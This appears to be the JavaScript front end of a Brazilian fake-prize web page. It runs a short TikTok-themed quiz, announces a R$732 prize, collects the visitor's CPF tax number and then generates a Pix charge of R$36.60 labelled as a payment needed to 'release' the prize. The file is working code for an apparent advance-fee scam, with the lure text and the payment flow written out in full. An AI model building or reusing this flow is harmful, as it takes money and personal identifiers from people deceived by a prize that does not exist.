/* script.js - quiz + fluxo de saque (Pix Woovi) */

const QUESTIONS = [
  "Quanto tempo você passa no TikTok por dia?",
  "Qual seu TikToker favorito?",
  "Você já fez trend viral?",
  "Qual tipo de conteúdo mais assiste?",
  "Quantos vídeos posta por semana?",
  "Você usa TikTok Live?",
  "Já comprou algo via TikTok Shop?"
];

const ANSWERS = [
  ["Menos de 1h", "1-2h", "2-4h", "Mais de 4h"],
  ["Vieginia", "Ruyter", "Gkay", "Outro"],
  ["Sim, várias", "Algumas", "Poucas", "Nunca"],
  ["Vídeos de dança", "Humor", "Tutoriais", "Diversos"],
  ["0", "1-2", "3-5", "Mais de 5"],
  ["Sim", "Não", "Às vezes", "Nunca"],
  ["Sim", "Não", "Às vezes", "Nunca"]
];

const FIXED_PRIZE = 36.60;  // valor fixo em reais
const TAX_RATE = 0.05;

let state = { index: 0, answers: [], selected: null };

const startBtn = document.getElementById('start-btn');
const startScreen = document.getElementById('start-screen');
const quizScreen = document.getElementById('quiz-screen');
const resultScreen = document.getElementById('result-screen');
const qNumSpan = document.getElementById('q-num');
const titleEl = document.getElementById('question-title');
const answersEl = document.getElementById('answers');
const nextBtn = document.getElementById('next-btn');
const progressFill = document.getElementById('progress-fill');

const resultText = document.getElementById('result-text');
const prizeBox = document.getElementById('prize-box');

const cpfInput = document.getElementById('cpf');
const cpfContinue = document.getElementById('cpf-continue');
const paymentSection = document.getElementById('payment-section');
const payBtn = document.getElementById('pay-btn');
const pixResult = document.getElementById('pix-result');
const qrCodeImg = document.getElementById('qrCode');
const pixCodeDiv = document.getElementById('pix-code');
const copyPixBtn = document.getElementById('copy-pix');
const restartBtn = document.getElementById('restart-btn');

startBtn.addEventListener('click', () => {
  startScreen.classList.add('hidden');
  quizScreen.classList.remove('hidden');
  state.index = 0;
  state.answers = [];
  renderQuestion();
});

function renderQuestion() {
  const q = QUESTIONS[state.index];
  const options = ANSWERS[state.index];
  qNumSpan.textContent = state.index + 1;
  titleEl.textContent = q;
  answersEl.innerHTML = '';

  options.forEach((txt,i)=>{
    const btn = document.createElement('button');
    btn.className = 'answer';
    btn.type = 'button';
    btn.innerText = txt;
    btn.onclick = () => {
      document.querySelectorAll('.answer').forEach(n => n.classList.remove('selected'));
      btn.classList.add('selected');
      state.selected = i;
    };
    answersEl.appendChild(btn);
  });

  nextBtn.textContent = (state.index === QUESTIONS.length - 1) ? 'Finalizar' : 'Próxima';
  updateProgress();
}

nextBtn.addEventListener('click', ()=>{
  if (state.selected === null) {
    alert('Selecione uma opção para continuar.');
    return;
  }
  state.answers.push(state.selected);
  state.selected = null;
  state.index++;
  if (state.index >= QUESTIONS.length) {
    finishQuiz();
  } else {
    renderQuestion();
  }
});

function updateProgress(){
  const pct = Math.round((state.index / QUESTIONS.length) * 100);
  progressFill.style.width = pct + '%';
}

function finishQuiz(){
  quizScreen.classList.add('hidden');
  resultScreen.classList.remove('hidden');

  const answered = state.answers.length;
  const prize = FIXED_PRIZE;

  resultText.innerHTML = `Você respondeu <strong>${answered}</strong> de ${QUESTIONS.length} perguntas.`;
  prizeBox.textContent = `Prêmio: R$732,00.`;

  payBtn.dataset.prize = prize;
  document.getElementById('valor-bruto').textContent = `R$ ${prize.toFixed(2).replace('.',',')}`;
  const fee = Math.round(prize * TAX_RATE * 100)/100;
  document.getElementById('valor-liquido').textContent = `R$ ${(prize-fee).toFixed(2).replace('.',',')}`;
}

cpfContinue.addEventListener('click', () => {
  const cpf = cpfInput.value.trim();
  if(!/^\d{11}$/.test(cpf)){
    alert('Digite um CPF válido (11 dígitos).');
    return;
  }
  paymentSection.classList.remove('hidden');
});

payBtn.addEventListener('click', async () => {
  const cpf = cpfInput.value.trim();
  if(!/^\d{11}$/.test(cpf)){
    alert('CPF inválido');
    return;
  }

  const valorCentavos = 3660; // 36,60 fixo

  payBtn.disabled = true;
  payBtn.textContent = 'Gerando Pix...';

  try {
    const res = await fetch('/gerar-pix',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({cpf, valorCentavos})
    });
    const data = await res.json();

    if(res.status!==200){
      console.error('Erro Woovi:', data);
      alert('Erro ao gerar Pix: '+JSON.stringify(data.error||data));
      payBtn.disabled=false;
      payBtn.textContent='Realizar pagamento para liberar prêmio';
      return;
    }

    const charge = data?.woovi?.charge || data?.woovi;
    const pixObj = charge?.paymentMethods?.pix || charge;
    const qr = pixObj?.qrCodeImage || charge?.qrCodeImage || '';
    const brcode = pixObj?.brCode || charge?.brCode || '';

    if(!qr && !brcode){
      console.error('Resposta sem qr/brcode:', data);
      alert('Não foi possível obter QR code.');
      payBtn.disabled=false;
      payBtn.textContent='Realizar pagamento para liberar prêmio';
      return;
    }

    qrCodeImg.src = qr;
    pixCodeDiv.textContent = brcode;
    pixResult.classList.remove('hidden');
    payBtn.style.display='none';

  } catch(err){
    console.error('Erro servidor:', err);
    alert('Erro ao gerar Pix (ver console).');
    payBtn.disabled=false;
    payBtn.textContent='Realizar pagamento para liberar prêmio';
  }
});

copyPixBtn.addEventListener('click', ()=>{
  const txt = pixCodeDiv.textContent.trim();
  if(!txt) return alert('Nenhum código para copiar.');
  navigator.clipboard.writeText(txt).then(()=> alert('Código Pix copiado!')).catch(()=> alert('Falha ao copiar'));
});

restartBtn.addEventListener('click', ()=>{
  resultScreen.classList.add('hidden');
  startScreen.classList.remove('hidden');
  progressFill.style.width='0%';
});
